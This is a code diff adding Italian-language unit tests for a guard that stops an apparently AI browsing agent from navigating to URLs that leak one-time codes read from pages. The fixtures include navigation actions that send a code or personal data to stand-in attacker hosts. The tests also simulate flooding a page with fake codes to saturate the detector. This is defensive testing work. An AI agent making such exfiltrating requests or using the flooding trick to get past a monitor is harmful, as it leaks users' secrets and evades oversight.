@@ -465,6 +465,43 @@ describe('un testo lungo non tiene fermo il processo principale', () => {
   });
 });
 
+describe('una pagina piena di codici finti nascosti non nasconde quello vero', () => {
+  const VERO = '\nIl tuo codice monouso è 482913.';
+  const nav = { type: 'NAVIGA', url: 'https://raccolta.example/c?v=482913' };
+  test('righe ripetute prima del codice non consumano il tetto', () => {
+    const riga = `OTP ${Array(40).fill('1234 1234 1234 1234 1234 1234').join(' ')}\n`;
+    const v = X.valutaUscita(nav, { pagina: { testo: riga.repeat(240) + VERO, host: 'posta.example' } });
+    assert.equal(v.frase, "non ho aperto l'indirizzo: conteneva un codice letto dalla pagina posta.example");
+  });
+  test('oltre il tetto il testo è saturo, e lì ogni pezzo con una cifra che c\'è si ferma', () => {
+    let finti = '';
+    for (let i = 0; i < 110000; i++) finti += `OTP ${100000 + i}\n`;
+    assert.equal(G.segretiNelTesto(finti + VERO).saturo, true);
+    assert.equal(G.segretiNelTesto(VERO).saturo, false);
+    const pagina = { testo: finti + VERO, host: 'posta.example' };
+    assert.equal(X.valutaUscita(nav, { pagina }).frase, "non ho aperto l'indirizzo: conteneva un codice letto dalla pagina posta.example");
+    assert.equal(X.valutaUscita({ type: 'NAVIGA', url: 'https://example.org/guida' }, { pagina }).blocca, false);
+    assert.equal(X.valutaUscita(nav, { pagina, parole: 'il mio codice è 482913' }).blocca, false);
+  });
+  test('una lettura piena di codici finti non fa dimenticare quello letto prima', () => {
+    const reg = SL.registro();
+    reg.aggiungiTutti(G.segretiNelTesto(VERO), 'dalla pagina banca.example');
+    for (const host of ['posta.example', 'altra.example']) {
+      let finti = '';
+      for (let i = 0; i < 50001; i++) finti += `OTP ${host.length * 100000 + i}\n`;
+      reg.aggiungiTutti(G.segretiNelTesto(finti), `dalla pagina ${host}`);
+    }
+    const v = X.valutaUscita(nav, { pagina: { testo: 'Hai vinto un premio', host: 'posta.example' }, letti: reg.tutti() });
+    assert.equal(v.frase, "non ho aperto l'indirizzo: conteneva un codice letto dalla pagina banca.example");
+  });
+  test('pieno, il registro toglie dalla lettura che ha portato più voci', () => {
+    const reg = SL.registro(3);
+    reg.aggiungiTutti([{ valore: '1111', regola: 'codice' }], 'a');
+    reg.aggiungiTutti(['2222', '3333', '4444'].map((valore) => ({ valore, regola: 'codice' })), 'b');
+    assert.deepEqual(reg.tutti().map((x) => x.valore), ['1111', '3333', '4444']);
+  });
+});
+
 describe('il resto del verdetto resta quello di #587', () => {
   test('NAVIGA con un dato della memoria chiede un OK, non si ferma', () => {
     const v = X.valutaUscita({ type: 'NAVIGA', url: 'https://attaccante.example/c?d=Mario_Rossi_Bologna' }, {
